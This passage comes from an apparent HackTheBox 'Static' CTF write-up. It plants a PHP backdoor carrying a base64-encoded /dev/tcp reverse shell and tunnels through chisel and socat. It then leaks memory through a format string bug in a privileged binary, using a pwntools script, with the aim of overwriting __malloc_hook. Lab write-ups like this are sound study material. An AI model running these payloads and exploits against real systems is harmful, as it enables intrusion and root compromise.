</code></pre></div><p>The PHP file will be called <code>b4ckd0or.php</code> and will have this content:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQu</span><span class="mtk4">Mi80NDQ0ICAwPiYx|base64 -d|bash"</span><span class="mtk1">); </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>  
</code></pre></div><p>Basic enumeration tells us that there is no <code>nc</code>, <code>curl</code> or <code>wget</code>. The best way to write a file is using <code>echo</code> and redirecting output. Take care about URL encoding as well:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"127.0.0.1:8080/index.php?a=echo+'&lt;?php+system(<span class="code-dark-cyan">\"</span>echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64+-d|bash<span class="code-dark-cyan">\"</span>);+?&gt;'+&gt;+uploads/b4ckd0or.php;echo+asdf&"</span>  
asdf

Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
batch mode: /usr/bin/ersatool create|print|revoke CN
</code></pre></div><p>Notice how I added <code>echo asdf</code> to know when the command was actually executed (remember that until the third or fourth attempt, the command does not work).</p><p>Now we need to transfer <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> to the <code>web</code> machine (using a Python HTTP server from the attacker machine):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/tmp$ wget -q 172.30.0.9/chisel  
www-data@web:/tmp$ mv chisel .chisel
www-data@web:/tmp$ chmod +x .chisel
</code></pre></div><p>The <code>web</code> machine will be the server, listening on port 1337:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/tmp$ ./.chisel server -p 1337 --reverse
server: Reverse tunnelling enabled
server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E=  
server: Listening on http://0.0.0.0:1337
</code></pre></div><p>The attacker machine will connect to the server (<code>172.20.0.10:1337</code>) and tell them to forward everything that arrives at <code>192.168.254.2:4444</code> (<code>web</code> machine) to port 4444 (attacker machine):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> client 172.20.0.10:1337 R:192.168.254.2:4444:0.0.0.0:4444  
client: Connecting to ws://172.20.0.10:1337
client: Connected (Latency 82.064375ms)
</code></pre></div><p>The output of the server will clarify the connection:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/tmp$ ./.chisel server -p 1337 --reverse
server: Reverse tunnelling enabled
server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E=
server: Listening on http://0.0.0.0:1337
server: session#1: tun: proxy#R:192.168.254.2:4444=>0.0.0.0:4444: Listening  
</code></pre></div><p>Now we can request the <code>/uploads/b4ckd0or.php</code> file we created and gain a proper reverse shell on the <code>pki</code> machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8080/uploads/b4ckd0or.php  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:59809.
bash: cannot set terminal process group (11): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@pki:~/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@pki:~/html/uploads$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@pki:~/html/uploads$ export TERM=xterm
www-data@pki:~/html/uploads$ export SHELL=bash
www-data@pki:~/html/uploads$ stty rows 50 columns 158
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>We are <code>www-data</code> user. This <code>pki</code> machine is a Docker container (because it contains a <code>.dockerenv</code> and has only a few commands):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:~/html/uploads$ ls -a /
.  ..  .dockerenv  bin  boot  dev  entry.sh  etc  home  lib  lib64  media  mnt  opt  php-src  proc  root  run  sbin  srv  sys  tmp  usr  var  
</code></pre></div><p>If we enumerate system capabilities, we see that the <code>ersatool</code> binary has <code>cap_setuid+eip</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:~/html/uploads$ getcap -r / 2&gt;/dev/null  
/usr/bin/ersatool = cap_setuid+eip
</code></pre></div><p>This means that in some points of the program the binary is allowed to perform elevated actions (as <code>root</code>). Let&rsquo;s check if there are more files related to this binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:~/html/uploads$ find / -name \*ersatool\* 2&gt;/dev/null  
/usr/src/ersatool.c
/usr/bin/ersatool
</code></pre></div><p>And we have the source code. This is nice to have because we can omit some reverse engineering tasks.</p><h3 id="finding-a-format-string-vulnerability">Finding a Format String vulnerability</h3><p>The binary is used to generate the VPN for the users. Maybe it needs to run as <code>root</code> during some tasks to read private keys, for example.</p><p>After having a look at the source code, we discover a Format String vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">printCN</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">cn</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">i</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> fn[</span><span class="mtk6">100</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> buffer[</span><span class="mtk6">100</span><span class="mtk1">];</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (i </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"print-&gt;CN="</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fflush</span><span class="mtk1">(stdout);</span>
<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(buffer, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(buffer));</span>
<span class="mtk1">    </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, buffer, </span><span class="mtk5">sizeof</span><span class="mtk1">(buffer));</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(buffer, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(buffer));</span>
<span class="mtk1">    </span><span class="mtk8">strncat</span><span class="mtk1">(buffer, cn, </span><span class="mtk5">sizeof</span><span class="mtk1">(buffer));</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">strncmp</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, buffer, </span><span class="mtk6">1</span><span class="mtk1">)) { </span><span class="mtk5">return</span><span class="mtk1">; }</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">strncpy</span><span class="mtk1">(fn, OUTPUT_DIR, </span><span class="mtk5">sizeof</span><span class="mtk1">(fn));</span>
<span class="mtk1">    </span><span class="mtk8">strncat</span><span class="mtk1">(fn, </span><span class="mtk4">"/"</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(fn) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(fn));</span>
<span class="mtk1">    </span><span class="mtk8">strncat</span><span class="mtk1">(fn, </span><span class="mtk8">strtok</span><span class="mtk1">(</span><span class="mtk8">basename</span><span class="mtk1">(buffer), </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">), </span><span class="mtk5">sizeof</span><span class="mtk1">(fn) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(fn));</span>  
<span class="mtk1">    </span><span class="mtk8">strncat</span><span class="mtk1">(fn, EXT, </span><span class="mtk5">sizeof</span><span class="mtk1">(fn) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(fn));</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(buffer);</span><span class="mtk3"> //checking buffer content</span>
<span class="mtk1">    </span><span class="mtk8">filePrint</span><span class="mtk1">(fn);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (i </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">print-&gt;CN="</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">fflush</span><span class="mtk1">(stdout);</span>
<span class="mtk1">      </span><span class="mtk8">memset</span><span class="mtk1">(buffer,</span><span class="mtk6">0</span><span class="mtk1">,</span><span class="mtk5">sizeof</span><span class="mtk1">(buffer));</span>
<span class="mtk1">      </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,buffer,</span><span class="mtk5">sizeof</span><span class="mtk1">(buffer));</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk8">strncmp</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, buffer, </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> i </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Can you see it? This is the vulnerable line:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(buffer);</span><span class="mtk3"> //checking buffer content</span>  
</code></pre></div><p>The variable <code>buffer</code> comes from direct user input, so we have control over the variable.</p><p>Format String vulnerabilities are really dangerous because we can read arbitrary data from the memory and even write and modify data from the memory to gain RCE.</p><p>Function <code>printf</code> uses format strings using special characters to print different type of data. For example:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1337</span><span class="mtk1">);</span><span class="mtk3"> // Prints: 1337</span>
<span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">"7Rocky"</span><span class="mtk1">);</span><span class="mtk3"> // Prints: 7Rocky</span>  
<span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%x\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">ACDC</span><span class="mtk1">);</span><span class="mtk3"> // Prints: acdc</span>
</code></pre></div><p>The <code>%n</code> format string writes the number of bytes written until its occurrence in the address given as argument preceding the format strings.</p><p>The issue is having control over the format string, because we can do the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:~/html/uploads$ ersatool
batch mode: /usr/bin/ersatool create|print|revoke CN
www-data@pki:~/html/uploads$ ersatool print %x
ff35015f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!  
www-data@pki:~/html/uploads$ ersatool
# print
print->CN=%x
ffe4827f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!
^C
</code></pre></div><p>The values <code>ff35015f</code> and <code>ffe4827f</code> are just values from the stack, we are leaking memory data.</p><p>Notice that the program can be used in interactive mode.</p><p>We can fuzz a little more using Python and check where the <code>AAAA</code> before the format strings are:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:~/html/uploads$ ersatool print $(python3 -c 'print("AAAA" + "%x." * 100)')
AAAAf7b2915f.ab89b864.f7b2915f.0.78252e78.da4b5a98.ab89be4d.41414141.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.ab89b830.74706f2f.61737279.73746e65.2e782541.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.[!] ERR reading /opt/easyrsa/clients/AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.!  
</code></pre></div><p>As showm, <code>41414141</code> (<code>AAAA</code> in hexadecimal ASCII values) is on the eighth position (offset <code>8</code>). This will be important for the exploitation process.</p><h3 id="network-setup-for-exploitation">Network setup for exploitation</h3><p>First, we will need to setup the network environment to have bidirectional connectivity between <code>pki</code> and the attacker machine.</p><p>One way is already setup:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">pki => 192.168.254.2:4444 (web) => 172.30.0.9:4444 (attacker)  
</code></pre></div><p>The other way will be this:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">attacker => 127.0.0.1:1234 => (web) => 192.168.254.3:1234 (pki)  
</code></pre></div><p>These will be the resulting connections:</p><p><img src="/images/HTB/Static/Static-port-forwarding.png" alt="Static port forwarding"></p><p>For this purpose, we can use SSH port forwarding as before (<code>ENTER</code> + <code>~C</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/tmp$
ssh&gt; -L 1234:192.168.254.3:1234  
Forwarding port.

www-data@web:/tmp$
</code></pre></div><p>Now we can easily transfer <code>ersatool</code> and <code>ersatool.c</code> to the attacker machine using Python (fortunately, <code>pki</code> has <code>python3</code> installed):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:~/html/uploads$ cd /
www-data@pki:~/$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 127.0.0.1:1234/usr/bin/ersatool

<span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 127.0.0.1:1234/usr/src/ersatool.c  
</code></pre></div><p>To build the exploit, we will also need the Glibc library:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/$ ldd /usr/bin/ersatool
        linux-vdso.so.1 (0x00007fff7f1f4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9381921000)  
        /lib64/ld-linux-x86-64.so.2 (0x00007f9381d12000)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 127.0.0.1:1234/lib/x86_64-linux-gnu/libc.so.6  
</code></pre></div><p>Finally, since it is a command line program, we will need to use <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat"><code>socat</code></a> in order to redirect our payloads that come from a TCP connection to the running binary.</p><p>We can transfer <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat"><code>socat</code></a> from the attacker machine to <code>pki</code> using this Python code:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">urllib</span><span class="mtk1">.</span><span class="mtk8 mtku">request</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8">urlopen</span>

<span class="mtk1">f</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'./socat'</span><span class="mtk1">, </span><span class="mtk4">'wb'</span><span class="mtk1">)</span>
<span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk8">urlopen</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://192.168.254.2:4444/socat</span><span class="mtk4">'</span><span class="mtk1">).read())</span>  
<span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><p>The attacker machine will have a HTTP web server on port 4444 (remember the connection setup):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 4444
Serving HTTP on :: port 4444 (http://[::]:4444/) ...  
</code></pre></div><p>The Python code for <code>pki</code> in a &ldquo;one-liner&rdquo; is like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/$ cd /tmp
www-data@pki:/tmp$ python3 -c 'from urllib.request import urlopen; f = open("./socat", "wb"); f.write(urlopen("http://192.168.254.2:4444/socat").read()); f.close()'  
www-data@pki:/tmp$ file socat
socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
</code></pre></div><p>Now we can launch <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat"><code>socat</code></a> and start working from the attacker machine from <code>127.0.0.1:1234</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/tmp$ chmod +x socat
www-data@pki:/tmp$ ./socat tcp-l:1234,reuseaddr,fork EXEC:/usr/bin/ersatool  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 127.0.0.1 1234
# print
print->CN=%x
f7410e5f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!  
</code></pre></div><h3 id="format-string-exploitation">Format String exploitation</h3><p>This is the basic information about the binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">ersatool</span>
ersatool: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped  

<span class="code-cyan">$</span> <span class="code-dark-green">checksec</span> <span class="mtku">ersatool</span>
[<span class="code-blue">*</span>] './ersatool'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled
</code></pre></div><ul><li>It is a 64-bit ELF binary.</li><li>It has NX enabled, which means that the stack is non-executable.</li><li>It has PIE enabled, which means that the base address of the proper binary is randomized (ASLR) so that it is reset every time the program restarts (the addresses of the functions are computed as an offset plus the base address).</li><li>Moreover, addresses of functions belonging to Glibc will also suffer from ASLR, because it is enabled:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/tmp$ cat /proc/sys/kernel/randomize_va_space  
2
</code></pre></div><p>We need to perform the following tasks to get RCE:</p><ol><li>Find the offset of the format string.</li><li>Leak an address of a function of the binary using the format string.</li><li>Compute the binary base address.</li><li>Leak an address of a function of Glibc using the format string.</li><li>Compute Glibc base address.</li><li>Set <code>__malloc_hook</code> function to a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell in Glibc using the format string.</li><li>Trigger <code>malloc</code> by allocating a large amount of memory.</li></ol><p><strong>Task 1</strong>: Already done, the format string offset is <code>8</code>.</p><p><strong>Task 2</strong>: To leak an address we must use format strings like <code>%x</code> or <code>%p</code> (both will print the hexadecimal value of an address, but the second will prepend <code>0x</code>). However, instead of putting a lot of format strings, we can take the position we desire using <code>%i$p</code>, where <code>i</code> is the position. This time, as it is a 64-bit binary, we need to use <code>%lx</code> or <code>%lp</code>.</p><p>Using this idea, let&rsquo;s build a simple Python script using <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> to dump the first 60 values from the stack:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">, </span><span class="mtk6">1234</span><span class="mtk1">)</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_value</span><span class="mtk1">(</span><span class="mtk9 mtki">i</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'print-&gt;CN='</span><span class="mtk1">, </span><span class="mtk7 mtki">f</span><span class="mtk4">'%</span><span class="mtk6">{</span><span class="mtk9 mtki">i</span><span class="mtk6">}</span><span class="mtk4">$lp'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1">[:</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[!] ERR'</span><span class="mtk1">)]</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk9 mtki">i</span><span class="mtk1">, </span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">decode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">decode</span><span class="mtk1">(), </span><span class="mtk6">16</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'# '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'print'</span><span class="mtk1">)</span>

<span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">61</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk8">get_value</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1234: Done  
1 0x5615109d815f
2 0x7ffdc8e5489a
3 0x5615109d815f
4 0x4a
5 0x696c632f61737279
6 0x1109d41d0
7 (nil)
8 0x706c243825
9 (nil)
...
19 (nil)
20 0x561500000000
21 0x7f4a39c0bf51
22 0x7361652f74706f2f
23 0x696c632f61737279
24 0x3432252f73746e65
25 0x6e70766f2e706c24
26 (nil)
...
33 (nil)
34 0x7f4a00000000
35 0x7f4a39bfd87d
36 (nil)
37 (nil)
38 0x7ffdc8e54940
39 0x5615109d4f83
40 0x7ffdc8e54a28
41 0x100000000
42 0x5615109d5070
43 0xa746e697270
44 (nil)
45 0x100000000
46 0x5615109d5070
47 0x7f4a39ba0b97
48 0x2000000000
49 0x7ffdc8e54a28
50 0x100000000
51 0x5615109d4e5b
52 (nil)
53 0xcc040442782a621f
54 0x5615109d41d0
55 0x7ffdc8e54a20
56 (nil)
57 (nil)
58 0x9fd5b4b24a6a621f
59 0x9eba560cce54621f
60 0x7ffd00000000
</code></pre></div><p>Bypassing ASLR is relatively simple, since the randomized base address always ends on three hexadecimal zeros. Hence, if we know the last three hexadecimal digits of an offset, we can easily identify the real address.</p><p>Let&rsquo;s take the offset of the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">ersatool</span> | <span class="code-dark-green">grep</span> <span class="code-yellow">' main'</span>
    86: 0000000000001e5b   524 FUNC    GLOBAL DEFAULT   14<span class="code-red">main </span>  
</code></pre></div><p>If we have a look at the values above, we discover that position 51 is <code>0x5615109d4e5b</code>, it ends with <code>e5b</code>. Then, we have found a way to leak the real address of <code>main</code> using <code>%51$lp</code> as a format string:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">main_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_value</span><span class="mtk1">(</span><span class="mtk6">51</span><span class="mtk1">)</span>
<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Address of main():'</span><span class="mtk1">, </span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">main_addr</span><span class="mtk1">))</span>  
